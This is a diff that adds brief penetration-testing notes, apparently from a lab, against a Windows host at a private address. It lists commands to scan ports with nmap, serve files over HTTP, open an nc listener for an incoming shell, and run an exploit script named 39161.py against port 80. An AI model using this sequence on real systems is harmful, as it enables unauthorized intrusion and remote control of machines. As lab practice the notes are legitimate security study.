@@ -1,0 +1,21 @@
+
+
+192.168.1.13 windows
+
+**nmap scan ports**
+nmap -sV -sC 192.168.1.13
+
+
+
+**start a simple http server**
+
+python3 -m http.server 80
+
+
+**set up nc in listening mode on Kali**
+nc -lvnp 443
+
+
+**execute the exploit**
+python ./39161.py 192.168.1.13 80
+
